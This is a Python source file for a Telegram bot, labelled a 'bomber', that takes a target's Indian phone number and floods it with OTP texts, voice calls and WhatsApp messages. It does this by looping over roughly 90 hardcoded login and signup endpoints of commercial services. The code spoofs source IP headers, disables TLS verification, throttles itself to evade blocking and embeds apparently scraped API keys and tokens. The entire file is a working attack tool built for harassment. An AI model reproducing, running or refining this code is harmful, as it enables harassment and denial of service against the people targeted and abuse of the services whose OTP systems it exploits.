import os
import sys
import time
import asyncio
import logging
import random
import uuid
from typing import Optional

import aiohttp
from telegram import Update, Bot, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters,
)
from starlette.applications import Starlette
from starlette.responses import PlainTextResponse, Response
from starlette.routing import Route
import uvicorn

# ================== CONFIG ==================
BOT_TOKEN       = os.environ.get("BOT_TOKEN", "") 
WEBHOOK_URL     = os.environ.get("RENDER_EXTERNAL_URL", "").rstrip("/")
PORT            = int(os.environ.get("PORT", 8000))

# FIXED CONFIG FOR CONTINUOUS SMS
CONCURRENCY     = 10   # Ek saath sirf 10 requests (Block hone se bachne ke liye)
DELAY           = 0.8  # Har round ke baad 0.8 second ka gap
REQUEST_TIMEOUT = 8
# ============================================

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger("tsunami")

user_sessions: dict = {}
_http_session: Optional[aiohttp.ClientSession] = None
telegram_app: Optional[Application] = None

def is_valid_target(num: str) -> bool:
    return num.isdigit() and len(num) == 10 and num[0] in "6789"

# =========================================================================
#  A TO Z APIS (Diljot + Tsunami Merged)
# =========================================================================
def build_endpoints():
    UA_C = "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36"
    UA_O = "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5"
    UA_C2 = "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36"
    UA_D = "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36"
    
    E = []

    # ==========================================
    # 1. DILJOT CALL / IVR APIS
    # ==========================================
    E.append({"name":"Swiggy_Call","method":"POST","url":"https://profile.swiggy.com/api/v3/app/request_call_verification","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.swiggy.com"},"data":'{"mobile":"{t}"}'})
    E.append({"name":"TataCapital_Voice","method":"POST","url":"https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}","isOtpViaCallAtLogin":"true"}'})
    E.append({"name":"1MG_Call","method":"POST","url":"https://www.1mg.com/auth_api/v6/create_token","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"number":"{t}","otp_on_call":true}'})
    E.append({"name":"Flipkart_Call","method":"POST","url":"https://2.rome.api.flipkart.com/api/4/user/otp/generate","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobileNumber":"{t}"}'})
    E.append({"name":"MagicPin_Call","method":"POST","url":"https://webapi.magicpin.in/ultron-web/sentAuthOtp_v2/","headers":{"Content-Type":"application/json","auth-secret-key":"kQLMCQBrfevxhzuPpFWT","Origin":"https://magicpin.in","User-Agent":UA_D},"data":'{"phoneNumber":"91{t}","authMethod":"call","token":""}'})
    E.append({"name":"Refyne_IVR","method":"POST","url":"https://prod-api.refyne.co.in/auth/v3/send-otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"channel":"IVR","recipient":"{t}"}'})
    E.append({"name":"SonyLiv_Voice","method":"POST","url":"https://apiv2.sonyliv.com/AGL/2.8/A/ENG/MWEB/IN/UP/CREATEOTP-V2","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobileNumber":"{t}","smsType":"Voice","channelPartnerID":"MSMIND","country":"IN","timestamp":"{timestamp}","otpSize":4,"isMobileMandatory":true,"loginType":"REGISTERORSIGNIN"}'})
    E.append({"name":"Snitch_Voice","method":"POST","url":"https://www.snitch.com/api/auth/resend-otp?mode=voice","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile_number":"+91{t}"}'})
    E.append({"name":"Ixigo_Call","method":"POST","url":"https://www.ixigo.com/api/v4/oauth/dual/mobile/send-otp","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":'token=0732ff21f3263cee48320831c049192e22ffa805b4ca14add9c963945e4de6dde05739779f718e1fe35faa7297ac035389752adfda0548baf249b0d9fdc6a05f&sixDigitOTP=true&prefix=%2B91&phone={t}&resendOnCall=true'})
    E.append({"name":"MMT_Call","method":"POST","url":"https://www.makemytrip.com/api/umbrella/otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}"}'})
    E.append({"name":"Rapido_Call","method":"POST","url":"https://rapido.bike/api/v2/otp/generate","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}"}'})
    E.append({"name":"Meesho_Call","method":"POST","url":"https://api.meesho.com/v2/auth/send_otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Zomato_Call","method":"POST","url":"https://www.zomato.com/php/asyncLogin.php","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":'phone={t}'})
    E.append({"name":"OYO_Call","method":"POST","url":"https://api.oyoroomscrm.com/api/v2/user/send_otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Astroyogi_Call","method":"POST","url":"https://comm.astroyogi.com/api/OtpComm/SendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Authorization":"Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJVc2VyVHlwZSI6IldlYlVzZXIiLCJFbnRpdHlJZCI6IjAiLCJTb3VyY2VVc2VyVHlwZSI6IiIsIlNvdXJjZUVudGl0eUlkIjoiIiwibmJmIjoxNzgwMTY4NDY1LCJleHAiOjE3ODc5NDQ0NjV9."},"data":'{"phoneCode":"91","countryCode":"IN","mobileNumber":"{t}","platform":"Web","IpAddress":"117.225.1.174","requestType":"call","countryCodeByHeader":"IN"}'})

    # ==========================================
    # 2. DILJOT WHATSAPP APIS
    # ==========================================
    E.append({"name":"KPN_WA","method":"POST","url":"https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone_number":{"number":"{t}","country_code":"+91"}}'})
    E.append({"name":"EkaCare_WA","method":"POST","url":"https://auth.eka.care/auth/init","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"payload":{"allowWhatsapp":true,"mobile":"+91{t}"},"type":"mobile"}'})
    E.append({"name":"MamaEarth_WA","method":"POST","url":"https://auth.mamaearth.in/v1/auth/initiate-signup","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}"}'})
    E.append({"name":"Havells_WA","method":"POST","url":"https://havells.com/otplogin/account/otploginpost/","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"form_key=GvFYqgGVWCkuLoNT&mobile_number={t}&is_whatsapp_promo=on"})
    E.append({"name":"HeroFinCorp_WA","method":"POST","url":"https://loans.apps.herofincorp.com/api/generateOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}","terms":true,"whatsapp":true}'})
    E.append({"name":"Refyne_WA","method":"POST","url":"https://prod-api.refyne.co.in/auth/v3/send-otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"channel":"WHATSAPP","recipient":"{t}"}'})
    E.append({"name":"MMT_WA","method":"POST","url":"https://mapi.makemytrip.com/ext/web/pwa/send/token/SIGNUP_OTP?region=in&language=eng&currency=inr","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"loginId":"{t}","type":6,"isEncoded":false,"channel":["MOBILE","WHATSAPP"],"appHashKey":"@www.makemytrip.com #","countryCode":"91"}'})
    E.append({"name":"HERE_WA","method":"POST","url":"https://app-api.here.co.in/users/v1/customer-portal/send-otp-for-portal","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}","countryCodeId":"b43569eb-6798-43fb-8d27-47d55d7c544b","source":"whatsapp"}'})
    E.append({"name":"VisitApp_WA","method":"POST","url":"https://api.getvisitapp.com/v3/new-auth/login-phone","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"channel":"whatsapp","resend":true,"countryCode":91,"phone":"{t}","platform":"WEB"}'})
    E.append({"name":"RegistaniaChar_WA","method":"POST","url":"https://admin.registaniachar.com/api/whatsapp/send-otp","headers":{"Content-Type":"application/json","User-Agent":UA_D,"X-Signature":"6d31a2232ee5ec6e868d2eade30e657ddce8f6ff4b417818313feef6a220a553"},"data":'{"phone":"{t}"}'})

    # ==========================================
    # 3. DILJOT SMS APIS
    # ==========================================
    E.append({"name":"Lenskart","method":"POST","url":"https://api-gateway.juno.lenskart.com/v3/customers/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phoneCode":"+91","telephone":"{t}"}'})
    E.append({"name":"NoBroker","method":"POST","url":"https://www.nobroker.in/api/v3/account/otp/send","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"phone={t}&countryCode=IN"})
    E.append({"name":"PharmEasy","method":"POST","url":"https://pharmeasy.in/api/v2/auth/send-otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Wakefit","method":"POST","url":"https://api.wakefit.co/api/consumer-sms-otp/","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}"}'})
    E.append({"name":"ShipRocket","method":"POST","url":"https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobileNumber":"{t}"}'})
    E.append({"name":"RentoMojo","method":"POST","url":"https://www.rentomojo.com/api/RMUsers/isNumberRegistered","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Khatabook","method":"POST","url":"https://api.khatabook.com/v1/auth/request-otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}","app_signature":"wk+avHrHZf2"}'})
    E.append({"name":"RummyCircle","method":"POST","url":"https://www.rummycircle.com/api/fl/auth/v3/getOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}","isPlaycircle":false}'})
    E.append({"name":"Revv","method":"POST","url":"https://st-core-admin.revv.co.in/stCore/api/customer/v1/init","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}","deviceType":"website"}'})
    E.append({"name":"PayMe_India","method":"POST","url":"https://api.paymeindia.in/api/v2/authentication/phone_no_verify/","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}","app_signature":"S10ePIIrbH3"}'})
    E.append({"name":"PaisaOnSalary","method":"POST","url":"https://cms.paisaonsalary.com/api/Api/Website/InstantJourneyController/appCustomerRegisteration","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}","event_name":"login"}'})
    E.append({"name":"LoanZap","method":"POST","url":"https://webapi.loanzap.in/v2/apply-loan/register-user","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"name":"Binod","mobile":"{t}","email":"test@gmail.com","terms":"1"}'})
    E.append({"name":"Apna","method":"POST","url":"https://production.apna.co/api/userprofile/v1/otp/","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"hash_type":"original","phone_number":"91{t}","request_id":"{timestamp}","retries":0}'})
    E.append({"name":"Moglix","method":"POST","url":"https://apinew.moglix.com/nodeApi/v1/login/sendOtpV2","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"email":"","phone":"{t}","type":"p","source":"signup","buildVersion":"37.3.1","metaSource":"","device":"mobile"}'})
    E.append({"name":"CreditSea","method":"POST","url":"https://backend.creditsea.com/api/v1/otp/generate-otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phoneNumber":"{t}","isWebUser":true}'})
    E.append({"name":"Penpencil","method":"POST","url":"https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189?smsType=0","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}","countryCode":"+91","subOrgId":"SUB-PWLI000"}'})
    E.append({"name":"BajajFinserv","method":"POST","url":"https://apigateway.bajajfinserv.in/apigateway/otp/sso","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobileNumber":"{t}","source":"WEB"}'})
    E.append({"name":"Udaan","method":"POST","url":"https://auth.udaan.com/api/otp/send?client_id=udaan-v2&whatsappConsent=true","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"mobile={t}"})
    E.append({"name":"SmartCoin","method":"POST","url":"https://webapp.smartcoin.co.in/webflow/pre_auth/otp/request","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone_number":"{t}","app_version":"100101","channel":"SMS","request_type":"REGISTRATION","onboarding_consent":true}'})
    E.append({"name":"OLX","method":"POST","url":"https://www.olx.in/api/auth/authenticate?lang=en-IN","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"method":"sms","phone":"{t}","language":"en-IN","grantType":"retry"}'})
    E.append({"name":"IGP","method":"POST","url":"https://www.igp.com/v2/loginSignup","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"email":"","mprefix":"91","mob":"{t}","cid":"99","claimNumber":false,"newUserFlag":false,"verifyOtp":false,"otp":"","isGuest":false,"isInternational":false}'})
    E.append({"name":"Sephora","method":"POST","url":"https://sephora.in/api/service/application/user/authentication/v1.0/login/otp?platform=6523fa5f41f4eb4c10a1d869","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}","country_code":"91"}'})
    E.append({"name":"JioSaavn","method":"POST","url":"https://api1.jiosaavn.com/jio/sendOtp?__call=jio%2FsendOtp&api_version=4&_format=json&_marker=0&ctx=wap6dot0","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone_number":"+91{t}"}'})
    E.append({"name":"Droom","method":"POST","url":"https://api.droom.in/v1/user/send-otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}","country_code":"91"}'})
    E.append({"name":"Licious","method":"POST","url":"https://www.licious.com/auth/api/v1/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}","countryCode":"+91"}'})
    E.append({"name":"Puma","method":"POST","url":"https://in.puma.com/on/demandware.store/Sites-IN-Site/en_IN/Login-OtpRegistration","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"dwfrm_phone={t}&format=ajax"})
    E.append({"name":"Decathlon","method":"POST","url":"https://www.decathlon.in/api/v1/auth/sendOTP","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}","isLogin":true}'})
    E.append({"name":"Groww","method":"POST","url":"https://groww.in/api/v2/auth/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}","platform":"WEB"}'})
    E.append({"name":"RedBus","method":"POST","url":"https://www.redbus.in/api/v2/auth/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}","source":"web"}'})
    
    # (Food, Grocery, E-comm, Travel, Fintech, etc. from your list)
    E.append({"name":"Dominos","method":"POST","url":"https://pizzaonline.dominos.co.in/api/v2/customer/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}"}'})
    E.append({"name":"McDelivery","method":"POST","url":"https://mcdelivery.mcdonaldsindia.com/api/customer/sendOTP","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"KFC_India","method":"POST","url":"https://online.kfc.co.in/api/customer/otp/generate","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"BurgerKing_IN","method":"POST","url":"https://bkdelivery.in/api/customer/send-otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Faasos","method":"POST","url":"https://faasos.com/api/v2/user/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}"}'})
    E.append({"name":"Behrouz","method":"POST","url":"https://behrouzbiryani.com/api/user/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}"}'})
    E.append({"name":"EatFit","method":"POST","url":"https://www.eatfit.in/api/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"FreshMenu","method":"POST","url":"https://www.freshmenu.com/api/customer/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Box8","method":"POST","url":"https://box8.in/api/v1/user/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}"}'})
    E.append({"name":"WowMomo","method":"POST","url":"https://wowmomo.com/api/user/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"BigBasket","method":"POST","url":"https://www.bigbasket.com/bb-oauth/api/v2.0/otp/generate/","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile_number":"{t}"}'})
    E.append({"name":"Blinkit","method":"POST","url":"https://api.grofers.com/v5/otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Zepto","method":"POST","url":"https://bff-gateway.zepto.com/api/v1/user/customer/send-otp-sms/","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobileNumber":"{t}"}'})
    E.append({"name":"Dunzo","method":"POST","url":"https://api.dunzo.in/api/v1/auth/otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone_number":"{t}"}'})
    E.append({"name":"JioMart","method":"POST","url":"https://www.jiomart.com/api/v1/user/send-otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}"}'})
    E.append({"name":"Grofers","method":"POST","url":"https://api.grofers.com/v4/otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Snapdeal","method":"POST","url":"https://www.snapdeal.com/authenticate/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}"}'})
    E.append({"name":"TataCliq","method":"POST","url":"https://www.tatacliq.com/api/v1/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}","state":"login"}'})
    E.append({"name":"Ajio","method":"POST","url":"https://www.ajio.com/api/otp/generate","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}"}'})
    E.append({"name":"Myntra","method":"POST","url":"https://www.myntra.com/gw/mobile-auth/otp/generate","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}"}'})
    E.append({"name":"Meesho","method":"POST","url":"https://www.meesho.com/api/v1/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"EaseMyTrip","method":"POST","url":"https://www.easemytrip.com/api/otp/SendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"Mobileno":"{t}","Type":"M"}'})
    E.append({"name":"Goibibo","method":"POST","url":"https://www.goibibo.com/api/v2/auth/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}","countryCode":"+91"}'})
    E.append({"name":"KreditBee","method":"POST","url":"https://api.kreditbee.in/api/v2/auth/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Acko","method":"POST","url":"https://www.acko.com/api/v2/auth/otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Netmeds","method":"POST","url":"https://www.netmeds.com/api/v2/auth/login/send-otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}"}'})
    E.append({"name":"1mg_SMS","method":"POST","url":"https://www.1mg.com/auth_api/v6/create_token","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"number":"{t}"}'})
    E.append({"name":"Unacademy","method":"POST","url":"https://unacademy.com/api/v2/user/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Vedantu","method":"POST","url":"https://api.vedantu.com/api/v1/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Purplle","method":"POST","url":"https://www.purplle.com/api/v2/auth/send-otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}"}'})
    E.append({"name":"Cultfit","method":"POST","url":"https://www.cult.fit/api/v2/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})

    return E

ENDPOINTS = build_endpoints()

# ================== HTTP SESSION ==================
async def get_http_session() -> aiohttp.ClientSession:
    global _http_session
    if _http_session is None or _http_session.closed:
        connector = aiohttp.TCPConnector(limit=100, limit_per_host=20, ssl=False)
        timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
        _http_session = aiohttp.ClientSession(connector=connector, timeout=timeout)
    return _http_session

async def fire_endpoint(ep: dict, target: str) -> bool:
    url = ep["url"].replace("{t}", target)
    spoof = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    headers = {k: v.replace("{t}", target) for k, v in ep["headers"].items()}
    headers["X-Forwarded-For"] = spoof
    headers["Client-IP"] = spoof
    headers["X-Request-Id"] = uuid.uuid4().hex

    data = ep["data"]
    if isinstance(data, str):
        data = data.replace("{t}", target)
        
    try:
        session = await get_http_session()
        async with session.request(method=ep["method"], url=url, headers=headers, data=data if data else None, ssl=False) as resp:
            await resp.read()
            if resp.status in (200, 201, 202):
                return True
            return False
    except Exception:
        return False

async def _fire_batch(batch, target):
    tasks = [fire_endpoint(ep, target) for ep in batch]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    return sum(1 for r in results if r is True)

# ================== BUTTON HANDLERS ==================
async def start_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    keyboard = [[InlineKeyboardButton("🚀 Start Bombing", callback_data="start_bomb")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    text = "🌊 **TSUNAMI + DILJOT BOMBER** 🌊\n\nMerged A to Z APIs. Click below to begin."
    await update.message.reply_text(text, reply_markup=reply_markup, parse_mode="Markdown")

async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id

    if query.data == "start_bomb":
        user_sessions[uid] = {"state": "awaiting_target", "running": False}
        await query.message.edit_text("📱 Send target number (10 digits, no +91):")
    
    elif query.data == "stop_bomb":
        s = user_sessions.get(uid)
        if s and s.get("running"):
            s["running"] = False
            s["cancelled"] = True
            await query.message.edit_text("🛑 **Stopping...**", parse_mode="Markdown")

# ================== TEXT HANDLER ==================
async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    text = update.message.text.strip()
    s = user_sessions.get(uid)
    
    if not s or s.get("state") != "awaiting_target":
        return
        
    if not is_valid_target(text):
        await update.message.reply_text("❌ Invalid. 10 digits starting with 6/7/8/9.")
        return

    s.update(target=text, state="running", running=True, cancelled=False, sent=0, round=0, started_at=time.time())
    
    keyboard = [[InlineKeyboardButton("🛑 Stop Bombing", callback_data="stop_bomb")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"🔥 **BOMBING STARTED** 🔥\n\n🎯 Target: `{text}`\n🔌 Endpoints: {len(ENDPOINTS)}\n⚡ Status: Running Smoothly...",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )
    
    asyncio.create_task(run_bombing(uid, s))

# ================== BOMBING LOGIC (FIXED FOR CONTINUOUS SMS) ==================
async def run_bombing(uid: int, s: dict):
    target = s["target"]
    sent = 0
    start = time.time()
    idx = 0
    
    try:
        while s.get("running"):
            s["round"] += 1
            batch = []
            for _ in range(CONCURRENCY):
                batch.append(ENDPOINTS[idx % len(ENDPOINTS)])
                idx += 1

            # Requests fire karein
            ok = await _fire_batch(batch, target)
            sent += ok
            s["sent"] = sent
            
            # Agar saari API block ho gayi hain (ok == 0), toh 3 sec wait karein
            if ok == 0:
                logger.info("⚠️ APIs block hain, 3 sec wait...")
                await asyncio.sleep(3.0) 
            else:
                # Warna normal gap rakhein
                await asyncio.sleep(DELAY)
                
    except Exception as e:
        logger.exception(f"Bombing error: {e}")
    finally:
        s["running"] = False

    try:
        bot = Bot(token=BOT_TOKEN)
        elapsed = int(time.time() - start)
        reason = "🛑 Stopped by you" if s.get("cancelled") else "✅ Done"
        await bot.send_message(uid, f"{reason}!\n\n📊 **Report for** `{target}`\n📨 Total Sent: *{sent}*\n⏱ Duration: {elapsed}s", parse_mode="Markdown")
    except Exception:
        pass

# ================== WEBHOOK & STARLETTE ==================
async def health(request): return PlainTextResponse("OK", status_code=200)
async def root(request): return PlainTextResponse("Tsunami + Diljot Bot is running 🌊")

async def startup():
    global telegram_app
    if not WEBHOOK_URL: return
    webhook_path = f"/webhook/{BOT_TOKEN}"
    full_url = f"{WEBHOOK_URL}{webhook_path}"
    
    telegram_app = Application.builder().token(BOT_TOKEN).updater(None).build()
    telegram_app.add_handler(CommandHandler("start", start_cmd))
    telegram_app.add_handler(CallbackQueryHandler(button_handler))
    telegram_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
    
    await telegram_app.initialize()
    await telegram_app.bot.set_webhook(url=full_url, allowed_updates=Update.ALL_TYPES)
    await telegram_app.start()
    logger.info(f"✅ Webhook set to {full_url}")

async def webhook(request):
    if telegram_app is None: return Response("not ready", status_code=503)
    try:
        data = await request.json()
        update = Update.de_json(data, telegram_app.bot)
        await telegram_app.process_update(update)
    except Exception as e: logger.exception(f"webhook error: {e}")
    return Response("ok")

async def shutdown():
    global _http_session, telegram_app
    if _http_session and not _http_session.closed: await _http_session.close()
    if telegram_app: await telegram_app.stop(); await telegram_app.shutdown()

def create_app() -> Starlette:
    routes = [Route("/", root), Route("/health", health), Route(f"/webhook/{BOT_TOKEN}", webhook, methods=["POST"])]
    return Starlette(routes=routes, on_startup=[startup], on_shutdown=[shutdown])

app = create_app()

if __name__ == "__main__":
    if not BOT_TOKEN: sys.exit(1)
    uvicorn.run(app, host="0.0.0.0", port=PORT, log_level="info")
